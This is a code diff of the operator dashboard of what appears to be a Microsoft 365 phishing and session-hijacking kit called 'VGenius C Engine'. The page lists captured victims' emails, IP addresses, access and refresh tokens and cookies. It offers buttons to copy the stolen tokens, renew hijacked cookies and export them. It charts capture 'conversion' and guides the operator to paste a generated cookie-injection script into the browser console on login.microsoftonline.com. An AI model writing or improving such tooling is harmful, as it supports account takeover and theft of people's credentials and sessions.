@@ -6,6 +6,39 @@
     <title>Captured Tokens – VGenius C Engine</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <link rel="stylesheet" href="assets/css/user.css">
+    <style>
+        .action-btn {
+            padding: 4px 10px;
+            font-size: 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            border: 1px solid var(--border);
+            background: transparent;
+            color: var(--text-main);
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .action-btn:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+        .action-btn.script-btn { border-color: rgba(0,255,204,0.3); }
+        .action-btn.script-btn:hover { background: rgba(0,255,204,0.1); }
+        .action-btn.renew-btn { border-color: rgba(59,130,246,0.3); }
+        .action-btn.renew-btn:hover { background: rgba(59,130,246,0.1); }
+        .action-btn.delete-btn { border-color: rgba(239,68,68,0.3); }
+        .action-btn.delete-btn:hover { background: rgba(239,68,68,0.1); }
+        .action-group {
+            display: flex;
+            gap: 4px;
+            flex-wrap: wrap;
+        }
+        .token-table td.actions-cell {
+            white-space: nowrap;
+        }
+    </style>
 </head>
 <body>
     <aside class="main-sidebar" id="mainSidebar"></aside>
@@ -36,10 +69,10 @@
         <div class="card" style="overflow:hidden;">
             <table class="tokens-table">
                 <thead>
-                    <tr><th>#</th><th>User</th><th>Date/Time</th><th>Last Renew</th><th>Notes</th><th>Action</th></tr>
+                    <tr><th>#</th><th>Email</th><th>Date/Time</th><th>IP Address</th><th>Token Type</th><th>Last Renew</th><th>Actions</th></tr>
                 </thead>
                 <tbody id="tokensTableBody">
-                    <tr><td colspan="6" class="empty-state">No tokens captured yet.</td></tr>
+                    <tr><td colspan="7" class="empty-state">No tokens captured yet.</td></tr>
                 </tbody>
             </table>
         </div>
@@ -48,31 +81,31 @@
 
     <!-- Token Detail Modal -->
     <div class="modal-overlay" id="detailModal" style="display:none;" onclick="if(event.target===this)closeDetailModal()">
-        <div class="modal-card">
+        <div class="modal-card" style="max-width:700px;">
             <div class="modal-header">
                 <span class="modal-title">Token Details</span>
                 <button class="modal-close" onclick="closeDetailModal()"><i class="fas fa-times"></i></button>
             </div>
-            <div id="detailContent"></div>
+            <div id="detailContent" style="padding:16px;"></div>
         </div>
     </div>
 
     <!-- Cookie Script Generator Modal -->
     <div class="modal-overlay" id="cookieScriptModal" style="display:none;" onclick="if(event.target===this)closeCookieScriptModal()">
-        <div class="modal-card" style="max-width:500px;">
+        <div class="modal-card" style="max-width:550px;">
             <div class="modal-header">
-                <span class="modal-title">Cookie Script Generator</span>
+                <span class="modal-title"><i class="fas fa-code" style="color:var(--accent);margin-right:8px;"></i>Cookie Script Generator</span>
                 <button class="modal-close" onclick="closeCookieScriptModal()"><i class="fas fa-times"></i></button>
             </div>
             <div style="padding:16px;">
-                <div style="background:rgba(0,255,204,0.08);border:1px solid rgba(0,255,204,0.2);border-radius:8px;padding:14px;margin-bottom:16px;font-size:12px;line-height:1.5;color:var(--text-main);">
-                    <strong style="color:var(--accent);margin-bottom:6px;display:block;"><i class="fas fa-clipboard-list"></i> Instructions:</strong>
+                <div style="background:rgba(0,255,204,0.08);border:1px solid rgba(0,255,204,0.2);border-radius:8px;padding:14px;margin-bottom:16px;font-size:12px;line-height:1.6;color:var(--text-main);">
+                    <strong style="color:var(--accent);margin-bottom:8px;display:block;"><i class="fas fa-clipboard-list"></i> Instructions:</strong>
                     1. Open <a href="https://login.microsoftonline.com" target="_blank" style="color:var(--accent);text-decoration:underline;">https://login.microsoftonline.com</a> in Chrome/Edge<br>
-                    2. Press F12 → Go to Console tab<br>
-                    3. Paste the script below and press Enter<br>
+                    2. Press <kbd style="background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-size:11px;">F12</kbd> → Go to Console tab<br>
+                    3. Paste the script below and press <kbd style="background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-size:11px;">Enter</kbd><br>
                     4. Wait ~3 seconds for completion
                 </div>
-                <textarea id="cookieScriptOutput" readonly style="width:100%;min-height:150px;font-family:var(--font-heading);font-size:10px;background:rgba(255,255,255,0.02);border:1px solid var(--border);border-radius:8px;color:var(--accent);padding:12px;resize:vertical;"></textarea>
+                <textarea id="cookieScriptOutput" readonly style="width:100%;min-height:180px;font-family:'Courier New',monospace;font-size:10px;background:rgba(255,255,255,0.02);border:1px solid var(--border);border-radius:8px;color:var(--accent);padding:12px;resize:vertical;line-height:1.5;"></textarea>
                 <div style="display:flex;gap:8px;margin-top:12px;">
                     <button class="btn-accent-sm" style="flex:1;padding:10px;" onclick="copyScriptOutput()"><i class="fas fa-copy"></i> Copy Script</button>
                     <button class="btn-outline" style="flex:1;padding:10px;" onclick="closeCookieScriptModal()"><i class="fas fa-times"></i> Cancel</button>
@@ -84,28 +117,40 @@
     <!-- Export Modal -->
     <div class="modal-overlay" id="exportModal" style="display:none;" onclick="if(event.target===this)closeExportModal()">
         <div class="modal-card" style="max-width:400px;text-align:center;">
-            <div class="modal-header"><span class="modal-title">Export Tokens</span><button class="modal-close" onclick="closeExportModal()"><i class="fas fa-times"></i></button></div>
-            <div style="display:flex;flex-direction:column;gap:12px;">
-                <button class="btn-accent-sm" style="width:100%;padding:14px;" onclick="exportTokens()"><i class="fas fa-download"></i> Export Only (JSON)</button>
-                <button class="btn-danger-sm" style="width:100%;padding:14px;" onclick="exportAndDelete()"><i class="fas fa-trash"></i> Export + Delete All</button>
+            <div class="modal-header">
+                <span class="modal-title">Export Tokens</span>
+                <button class="modal-close" onclick="closeExportModal()"><i class="fas fa-times"></i></button>
+            </div>
+            <div style="padding:20px 0;">
+                <p style="font-size:13px;color:var(--muted);margin-bottom:20px;">Choose export option:</p>
+                <div style="display:flex;flex-direction:column;gap:10px;">
+                    <button class="btn-accent-sm" style="width:100%;padding:14px;" onclick="exportTokens()"><i class="fas fa-download"></i> Export Only (JSON)</button>
+                    <button class="btn-danger-sm" style="width:100%;padding:14px;" onclick="confirmExportAndDelete()"><i class="fas fa-trash"></i> Export + Delete All</button>
+                </div>
             </div>
         </div>
     </div>
 
     <!-- Chart Modal -->
     <div class="modal-overlay" id="chartModal" style="display:none;" onclick="if(event.target===this)closeChartModal()">
-        <div class="modal-card" style="max-width:800px;">
-            <div class="modal-header"><span class="modal-title">Token Trends</span><button class="modal-close" onclick="closeChartModal()"><i class="fas fa-times"></i></button></div>
-            <div style="display:flex;gap:4px;margin-bottom:20px;" id="chartTabs">
-                <button class="btn-outline" style="padding:6px 16px;font-size:10px;" data-days="14" onclick="setChartTab(this,14)">14D</button>
-                <button class="btn-outline" style="padding:6px 16px;font-size:10px;" data-days="30" onclick="setChartTab(this,30)">30D</button>
-                <button class="btn-outline" style="padding:6px 16px;font-size:10px;" data-days="90" onclick="setChartTab(this,90)">90D</button>
-                <button class="btn-outline" style="padding:6px 16px;font-size:10px;" data-days="180" onclick="setChartTab(this,180)">6M</button>
-                <button class="btn-outline" style="padding:6px 16px;font-size:10px;" data-days="365" onclick="setChartTab(this,365)">1Y</button>
-                <button class="btn-outline" style="padding:6px 16px;font-size:10px;" data-days="9999" onclick="setChartTab(this,9999)">Max</button>
+        <div class="modal-card" style="max-width:900px;">
+            <div class="modal-header">
+                <span class="modal-title">Token Trends</span>
+                <button class="modal-close" onclick="closeChartModal()"><i class="fas fa-times"></i></button>
             </div>
-            <canvas id="tokenChart" width="700" height="300" style="width:100%;"></canvas>
-            <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-top:20px;" id="chartInsights"></div>
+            <div style="padding:16px;">
+                <div style="display:flex;gap:4px;margin-bottom:20px;flex-wrap:wrap;" id="chartTabs">
+                    <button class="btn-outline" style="padding:6px 16px;font-size:10px;" data-days="14" onclick="setChartTab(this,14)">14D</button>
+                    <button class="btn-outline" style="padding:6px 16px;font-size:10px;" data-days="30" onclick="setChartTab(this,30)">30D</button>
+                    <button class="btn-outline" style="padding:6px 16px;font-size:10px;" data-days="90" onclick="setChartTab(this,90)">90D</button>
+                    <button class="btn-outline" style="padding:6px 16px;font-size:10px;" data-days="180" onclick="setChartTab(this,180)">6M</button>
+                    <button class="btn-outline" style="padding:6px 16px;font-size:10px;" data-days="365" onclick="setChartTab(this,365)">1Y</button>
+                </div>
+                <div style="position:relative;height:300px;">
+                    <canvas id="tokenChart"></canvas>
+                </div>
+                <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-top:20px;" id="chartInsights"></div>
+            </div>
         </div>
     </div>
 
@@ -116,30 +161,35 @@
         if (!token) window.location.href = "/user-panel/index";
         let currentDetailId = null;
         let chartInstance = null;
+        let currentChartDays = 14;
 
         initShared('tokens');
 
         async function loadTokens(page = 1) {
             const search = document.getElementById('tokenSearch').value;
             const sort = document.getElementById('tokenSort').value;
-            const res = await fetch(`${API}/tokens?search=${search}&sort=${sort}&page=${page}&limit=30`, { headers: authHeaders() });
+            const res = await fetch(`${API}/tokens?search=${encodeURIComponent(search)}&sort=${sort}&page=${page}&limit=30`, { headers: authHeaders() });
             const data = await res.json();
             document.getElementById('tokenCount').textContent = data.total + ' Total';
             const tbody = document.getElementById('tokensTableBody');
             if (!data.tokens.length) {
-                tbody.innerHTML = '<tr><td colspan="6" class="empty-state"><i class="fas fa-inbox"></i>No tokens captured yet.</td></tr>';
+                tbody.innerHTML = '<tr><td colspan="7" class="empty-state"><i class="fas fa-inbox"></i>No tokens captured yet.</td></tr>';
                 return;
             }
             tbody.innerHTML = data.tokens.map((t, i) => `
-                <tr class="token-row" onclick="openDetailModal(${t.id})">
+                <tr class="token-row">
                     <td>${(page-1)*30 + i + 1}</td>
-                    <td>${t.email || '—'}</td>
-                    <td>${formatDate(t.created_at)}</td>
-                    <td>${t.last_renewed ? formatDate(t.last_renewed) : '—'}</td>
-                    <td>${t.notes ? t.notes.substring(0,30)+'...' : '—'}</td>
-                    <td>
-                        <button class="btn-outline" style="padding:4px 10px;font-size:10px;" onclick="event.stopPropagation();openDetailModal(${t.id})"><i class="fas fa-eye"></i></button>
-                        <button class="btn-danger-sm" style="padding:4px 10px;font-size:10px;" onclick="event.stopPropagation();deleteToken(${t.id})"><i class="fas fa-trash"></i></button>
+                    <td style="font-weight:600;">${t.email || '—'}</td>
+                    <td style="font-size:11px;color:var(--muted);">${formatDate(t.created_at)}</td>
+                    <td style="font-size:11px;font-family:var(--font-heading);">${t.ip_address || '—'}</td>
+                    <td><span class="badge" style="font-size:9px;">${t.token_type === 'cookie' ? '🍪 Cookie' : '🔑 Token'}</span></td>
+                    <td style="font-size:11px;color:var(--muted);">${t.last_renewed ? formatDate(t.last_renewed) : '—'}</td>
+                    <td class="actions-cell">
+                        <div class="action-group">
+                            ${t.cookies ? `<button class="action-btn script-btn" onclick="generateCookieScript(${t.id})" title="Generate Cookie Script"><i class="fas fa-code"></i> Script</button>` : ''}
+                            ${t.token_type === 'cookie' ? `<button class="action-btn renew-btn" onclick="renewCookies(${t.id}, this)" title="Renew Cookies"><i class="fas fa-rotate"></i> Refresh</button>` : ''}
+                            <button class="action-btn delete-btn" onclick="deleteToken(${t.id})" title="Delete Token"><i class="fas fa-trash"></i></button>
+                        </div>
                     </td>
                 </tr>
             `).join('');
@@ -150,27 +200,25 @@
             const res = await fetch(`${API}/tokens/${id}`, { headers: authHeaders() });
             const t = await res.json();
             document.getElementById('detailContent').innerHTML = `
-                <div class="detail-row"><span class="detail-label">Email</span><span class="detail-value">${t.email || '—'}</span></div>
-                <div class="detail-row"><span class="detail-label">Access Token</span><span class="detail-value masked-token" onclick="copyToClipboard('${t.access_token || ''}')">${(t.access_token||'').substring(0,20)}... <i class="fas fa-copy"></i></span></div>
-                <div class="detail-row"><span class="detail-label">Refresh Token</span><span class="detail-value masked-token" onclick="copyToClipboard('${t.refresh_token || ''}')">${(t.refresh_token||'').substring(0,20)}... <i class="fas fa-copy"></i></span></div>
-                <div class="detail-row"><span class="detail-label">Cookies</span><span class="detail-value masked-token" onclick="copyToClipboard('${t.cookies || ''}')">${(t.cookies||'').substring(0,30)}... <i class="fas fa-copy"></i></span></div>
-                <div class="detail-row"><span class="detail-label">IP Address</span><span class="detail-value">${t.ip_address || '—'}</span></div>
-                <div class="detail-row"><span class="detail-label">User Agent</span><span class="detail-value">${(t.user_agent||'').substring(0,60)}</span></div>
-                <div class="detail-row"><span class="detail-label">Captured</span><span class="detail-value">${formatDate(t.created_at)}</span></div>
-                <div class="detail-row"><span class="detail-label">Expires</span><span class="detail-value">${formatDate(t.expiration)}</span></div>
-                <div class="detail-row"><span class="detail-label">Last Renewed</span><span class="detail-value">${t.last_renewed ? formatDate(t.last_renewed) : '—'}</span></div>
-                <div class="detail-row"><span class="detail-label">Renewal Count</span><span class="detail-value">${t.renewal_count || 0}</span></div>
-                <div style="margin-top:16px;">
-                    <label class="detail-label" style="display:block;margin-bottom:4px;">Notes</label>
-                    <textarea id="notesInput" onchange="saveNotes(${t.id})" style="width:100%;padding:10px;background:rgba(255,255,255,0.02);border:1px solid var(--border);border-radius:8px;color:var(--text-main);font-size:12px;resize:vertical;min-height:60px;outline:none;">${t.notes || ''}</textarea>
-                </div>
-                <div style="display:flex;gap:8px;margin-top:12px;">
-                    ${t.cookies ? '<button class="btn-accent-sm" onclick="generateCookieScript('+t.id+')"><i class="fas fa-code"></i> Cookie Script</button>' : ''}
-                    ${t.token_type === 'cookie' ? '<button class="btn-outline" onclick="renewCookies('+t.id+')"><i class="fas fa-rotate"></i> Renew</button>' : ''}
-                </div>
-                <div id="cookieScriptOutput" style="margin-top:12px;display:none;">
-                    <textarea readonly style="width:100%;min-height:80px;font-family:var(--font-heading);font-size:10px;background:rgba(255,255,255,0.02);border:1px solid var(--border);border-radius:8px;color:var(--accent);padding:10px;"></textarea>
-                    <button class="btn-accent-sm" style="margin-top:4px;" onclick="copyScriptOutput()"><i class="fas fa-copy"></i> Copy</button>
+                <div style="display:grid;gap:12px;">
+                    <div class="detail-row"><span class="detail-label">Email</span><span class="detail-value">${t.email || '—'}</span></div>
+                    <div class="detail-row"><span class="detail-label">Token Type</span><span class="detail-value">${t.token_type === 'cookie' ? '🍪 Cookie Capture' : '🔑 Token Capture'}</span></div>
+                    <div class="detail-row"><span class="detail-label">IP Address</span><span class="detail-value">${t.ip_address || '—'}</span></div>
+                    <div class="detail-row"><span class="detail-label">User Agent</span><span class="detail-value" style="font-size:11px;max-width:400px;overflow:hidden;text-overflow:ellipsis;">${(t.user_agent||'').substring(0,80)}</span></div>
+                    <div class="detail-row"><span class="detail-label">Captured</span><span class="detail-value">${formatDate(t.created_at)}</span></div>
+                    <div class="detail-row"><span class="detail-label">Expires</span><span class="detail-value">${t.expiration ? formatDate(t.expiration) : '—'}</span></div>
+                    <div class="detail-row"><span class="detail-label">Last Renewed</span><span class="detail-value">${t.last_renewed ? formatDate(t.last_renewed) : '—'}</span></div>
+                    <div class="detail-row"><span class="detail-label">Renewal Count</span><span class="detail-value">${t.renewal_count || 0}</span></div>
+                    <div style="margin-top:8px;">
+                        <label class="detail-label" style="display:block;margin-bottom:4px;">Notes</label>
+                        <textarea id="notesInput" onchange="saveNotes(${t.id})" style="width:100%;padding:10px;background:rgba(255,255,255,0.02);border:1px solid var(--border);border-radius:8px;color:var(--text-main);font-size:12px;resize:vertical;min-height:60px;outline:none;">${t.notes || ''}</textarea>
+                    </div>
+                    <div style="display:flex;gap:8px;margin-top:8px;flex-wrap:wrap;">
+                        ${t.cookies ? '<button class="btn-accent-sm" onclick="generateCookieScript('+t.id+')"><i class="fas fa-code"></i> Cookie Script</button>' : ''}
+                        ${t.token_type === 'cookie' ? '<button class="btn-outline" onclick="renewCookies('+t.id+', null)"><i class="fas fa-rotate"></i> Renew</button>' : ''}
+                        <button class="btn-outline" onclick="copyToClipboard('${t.access_token || ''}')"><i class="fas fa-copy"></i> Access Token</button>
+                        <button class="btn-outline" onclick="copyToClipboard('${t.refresh_token || ''}')"><i class="fas fa-copy"></i> Refresh Token</button>
+                    </div>
                 </div>
             `;
             document.getElementById('detailModal').style.display = 'flex';
@@ -183,14 +231,27 @@
         function closeCookieScriptModal() { document.getElementById('cookieScriptModal').style.display = 'none'; }
 
         async function exportTokens() {
-            const res = await fetch(`${API}/tokens/export`, { method: 'POST', headers: authHeaders() });
-            const data = await res.json();
-            downloadJSON(data, 'tokens-export-' + Date.now() + '.json');
-            closeExportModal();
-            showToast('Tokens exported');
+            try {
+                const res = await fetch(`${API}/tokens/export`, { method: 'POST', headers: authHeaders() });
+                const data = await res.json();
+                if (data.error) throw new Error(data.error);
+                const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `vgenius-tokens-${Date.now()}.json`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                closeExportModal();
+                showToast(`Exported ${data.count || data.tokens?.length || 0} tokens`);
+            } catch(e) {
+                showToast('Export failed: ' + e.message, true);
+            }
         }
 
-        async function exportAndDelete() {
+        function confirmExportAndDelete() {
             showConfirm({
                 title: 'Export & Delete All Tokens',
                 message: 'This will export all tokens to a JSON file and then permanently delete them from the database. This action cannot be undone.',
@@ -199,11 +260,22 @@
                     try {
                         const res = await fetch(`${API}/tokens/export-delete-all`, { method: 'POST', headers: authHeaders() });
                         const data = await res.json();
-                        downloadJSON(data, 'tokens-export-deleted-' + Date.now() + '.json');
+                        if (data.error) throw new Error(data.error);
+                        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = `vgenius-tokens-deleted-${Date.now()}.json`;
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                        URL.revokeObjectURL(url);
                         closeExportModal();
                         loadTokens();
-                        showToast('Exported and deleted ' + data.count + ' tokens');
-                    } catch(e) { showToast('Error: ' + e.message, true); }
+                        showToast(`Exported and deleted ${data.count} tokens`);
+                    } catch(e) {
+                        showToast('Error: ' + e.message, true);
+                    }
                 }
             });
         }
@@ -214,9 +286,13 @@
                 message: 'Are you sure you want to delete this token? This action cannot be undone.',
                 confirmText: 'Delete',
                 onConfirm: async () => {
-                    await fetch(`${API}/tokens/${id}`, { method: 'DELETE', headers: authHeaders() });
-                    loadTokens();
-                    showToast('Token deleted');
+                    try {
+                        await fetch(`${API}/tokens/${id}`, { method: 'DELETE', headers: authHeaders() });
+                        loadTokens();
+                        showToast('Token deleted');
+                    } catch(e) {
+                        showToast('Delete failed: ' + e.message, true);
+                    }
                 }
             });
         }
@@ -224,52 +300,176 @@
         async function saveNotes(id) {
             const notes = document.getElementById('notesInput').value;
             await fetch(`${API}/tokens/${id}/notes`, { method: 'PUT', headers: authHeaders(), body: JSON.stringify({ notes }) });
+            showToast('Notes saved');
         }
 
         async function generateCookieScript(id) {
-            const res = await fetch(`${API}/tokens/${id}/cookie-script`, { headers: authHeaders() });
-            const data = await res.json();
-            const textarea = document.getElementById('cookieScriptOutput');
-            textarea.value = data.script;
-            openCookieScriptModal();
+            try {
+                openCookieScriptModal();
+                const textarea = document.getElementById('cookieScriptOutput');
+                textarea.value = 'Generating script...';
+                const res = await fetch(`${API}/tokens/${id}/cookie-script`, { headers: authHeaders() });
+                const data = await res.json();
+                if (data.error) throw new Error(data.error);
+                textarea.value = data.script;
+            } catch(e) {
+                document.getElementById('cookieScriptOutput').value = 'Error: ' + e.message;
+            }
         }
 
-        async function renewCookies(id) {
-            const res = await fetch(`${API}/tokens/${id}/renew`, { method: 'POST', headers: authHeaders() });
-            const data = await res.json();
-            if (data.success) { showToast('Cookies renewed'); closeDetailModal(); loadTokens(); }
-            else showToast('Renewal failed: ' + (data.error || 'unknown'), true);
+        async function renewCookies(id, btn) {
+            const originalText = btn ? btn.innerHTML : 'Renewing...';
+            if (btn) {
+                btn.disabled = true;
+                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Refreshing...';
+            }
+            try {
+                const res = await fetch(`${API}/tokens/${id}/renew`, { method: 'POST', headers: authHeaders() });
+                const data = await res.json();
+                if (data.success) {
+                    showToast('Cookies renewed successfully');
+                    loadTokens();
+                    if (currentDetailId) openDetailModal(currentDetailId);
+                } else {
+                    showToast('Renewal failed: ' + (data.error || 'unknown'), true);
+                }
+            } catch(e) {
+                showToast('Renewal failed: ' + e.message, true);
+            } finally {
+                if (btn) {
+                    btn.disabled = false;
+                    btn.innerHTML = originalText;
+                }
+            }
         }
 
-        function copyToClipboard(text) { navigator.clipboard.writeText(text).then(() => showToast('Copied')); }
-        function copyScriptOutput() { navigator.clipboard.writeText(document.querySelector('#cookieScriptOutput textarea').value).then(() => showToast('Script copied')); }
-        function downloadJSON(data, filename) { const b = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' }); const u = URL.createObjectURL(b); const a = document.createElement('a'); a.href = u; a.download = filename; a.click(); URL.revokeObjectURL(u); }
+        function copyToClipboard(text) {
+            if (!text) return showToast('Nothing to copy', true);
+            navigator.clipboard.writeText(text).then(() => showToast('Copied to clipboard'));
+        }
 
-        function openChartModal() { document.getElementById('chartModal').style.display = 'flex'; loadChart(14); }
-        function closeChartModal() { document.getElementById('chartModal').style.display = 'none'; if (chartInstance) { chartInstance.destroy(); chartInstance = null; } }
-        function setChartTab(btn, days) { document.querySelectorAll('#chartTabs button').forEach(b => b.style.borderColor = ''); btn.style.borderColor = 'var(--accent)'; loadChart(days); }
+        function copyScriptOutput() {
+            const text = document.getElementById('cookieScriptOutput').value;
+            if (text === 'Generating script...' || !text) return showToast('No script to copy', true);
+            navigator.clipboard.writeText(text).then(() => showToast('Script copied to clipboard'));
+        }
+
+        function openChartModal() { 
+            document.getElementById('chartModal').style.display = 'flex'; 
+            loadChart(currentChartDays || 14); 
+        }
+        function closeChartModal() { 
+            document.getElementById('chartModal').style.display = 'none'; 
+            if (chartInstance) { chartInstance.destroy(); chartInstance = null; } 
+        }
+        function setChartTab(btn, days) { 
+            currentChartDays = days;
+            document.querySelectorAll('#chartTabs button').forEach(b => { b.style.borderColor = ''; b.style.background = ''; });
+            btn.style.borderColor = 'var(--accent)';
+            btn.style.background = 'rgba(0,255,204,0.1)';
+            loadChart(days); 
+        }
 
         async function loadChart(days) {
-            const res = await fetch(`${API}/analytics/visitors/daily?days=${days}`, { headers: authHeaders() });
-            const data = await res.json();
-            const ctx = document.getElementById('tokenChart').getContext('2d');
-            if (chartInstance) chartInstance.destroy();
-            chartInstance = new Chart(ctx, {
-                type: 'line',
-                data: { labels: data.map(d => d.date), datasets: [{ label: 'Tokens', data: data.map(d => d.count), borderColor: '#00ff66', backgroundColor: 'rgba(0,255,102,0.05)', fill: true, tension: 0.4, pointRadius: 4, pointBackgroundColor: '#00ff66', borderWidth: 2 }] },
-                options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } }, scales: { x: { ticks: { color: '#71717a', font: { size: 10 } }, grid: { color: 'rgba(255,255,255,0.03)' } }, y: { ticks: { color: '#71717a', font: { size: 10 } }, grid: { color: 'rgba(255,255,255,0.03)' } } } }
-            });
-            const total = data.reduce((s, d) => s + d.count, 0);
-            const done = data.reduce((s, d) => s + (d.done_count || 0), 0);
-            document.getElementById('chartInsights').innerHTML = `
-                <div class="counter-box"><div class="counter-value" style="color:var(--accent);">${total}</div><div class="counter-label">Total</div></div>
-                <div class="counter-box"><div class="counter-value" style="color:var(--accent);">${data.length ? (done/total*100).toFixed(1) : 0}%</div><div class="counter-label">Conversion</div></div>
-                <div class="counter-box"><div class="counter-value" style="color:var(--accent);">${done}</div><div class="counter-label">Done</div></div>
-                <div class="counter-box"><div class="counter-value" style="color:var(--accent);">${total-done}</div><div class="counter-label">Other</div></div>
-            `;
+            try {
+                const res = await fetch(`${API}/analytics/visitors/daily?days=${days}`, { headers: authHeaders() });
+                const data = await res.json();
+                if (!data || !data.length) {
+                    document.getElementById('chartInsights').innerHTML = '<div style="grid-column:1/-1;text-align:center;color:var(--muted);padding:40px;"><i class="fas fa-chart-line" style="font-size:32px;margin-bottom:12px;opacity:0.3;"></i><p>No data available for this period</p></div>';
+                    return;
+                }
+                const ctx = document.getElementById('tokenChart');
+                if (!ctx) return;
+                if (chartInstance) chartInstance.destroy();
+                
+                const labels = data.map(d => d.date);
+                const values = data.map(d => d.count || 0);
+                
+                chartInstance = new Chart(ctx.getContext('2d'), {
+                    type: 'line',
+                    data: {
+                        labels: labels,
+                        datasets: [{
+                            label: 'Tokens Captured',
+                            data: values,
+                            borderColor: '#00ff66',
+                            backgroundColor: 'rgba(0,255,102,0.08)',
+                            fill: true,
+                            tension: 0.4,
+                            pointRadius: 3,
+                            pointBackgroundColor: '#00ff66',
+                            pointBorderColor: '#00ff66',
+                            pointHoverRadius: 6,
+                            borderWidth: 2
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        plugins: {
+                            legend: { display: false },
+                            tooltip: {
+                                backgroundColor: 'rgba(0,0,0,0.8)',
+                                titleColor: '#fff',
+                                bodyColor: '#fff',
+                                borderColor: 'rgba(0,255,102,0.3)',
+                                borderWidth: 1,
+                                padding: 12,
+                                displayColors: false
+                            }
+                        },
+                        scales: {
+                            x: {
+                                ticks: { color: '#71717a', font: { size: 10 }, maxRotation: 45 },
+                                grid: { color: 'rgba(255,255,255,0.03)' }
+                            },
+                            y: {
+                                beginAtZero: true,
+                                ticks: { color: '#71717a', font: { size: 10 }, stepSize: 1 },
+                                grid: { color: 'rgba(255,255,255,0.03)' }
+                            }
+                        }
+                    }
+                });
+                
+                const total = values.reduce((s, v) => s + v, 0);
+                const done = data.reduce((s, d) => s + (d.done_count || 0), 0);
+                const unique = data.reduce((s, d) => s + (d.unique_ips || 0), 0);
+                const conversion = total > 0 ? (done/total*100).toFixed(1) : 0;
+                
+                document.getElementById('chartInsights').innerHTML = `
+                    <div class="counter-box">
+                        <div class="counter-value" style="color:var(--accent);">${total}</div>
+                        <div class="counter-label">Total Tokens</div>
+                    </div>
+                    <div class="counter-box">
+                        <div class="counter-value" style="color:var(--accent);">${conversion}%</div>
+                        <div class="counter-label">Conversion</div>
+                    </div>
+                    <div class="counter-box">
+                        <div class="counter-value" style="color:var(--accent);">${done}</div>
+                        <div class="counter-label">Completed</div>
+                    </div>
+                    <div class="counter-box">
+                        <div class="counter-value" style="color:var(--accent);">${unique}</div>
+                        <div class="counter-label">Unique IPs</div>
+                    </div>
+                `;
+            } catch(e) {
+                console.error('Chart load error:', e);
+                document.getElementById('chartInsights').innerHTML = '<div style="grid-column:1/-1;text-align:center;color:var(--danger);">Failed to load chart data</div>';
+            }
         }
 
-        document.addEventListener('keydown', (e) => { if (e.key === 'Escape') { closeDetailModal(); closeExportModal(); closeCookieScriptModal(); closeChartModal(); } });
+        document.addEventListener('keydown', (e) => { 
+            if (e.key === 'Escape') { 
+                closeDetailModal(); 
+                closeExportModal(); 
+                closeCookieScriptModal(); 
+                closeChartModal(); 
+            } 
+        });
+        
         loadTokens();
     </script>
 </body>
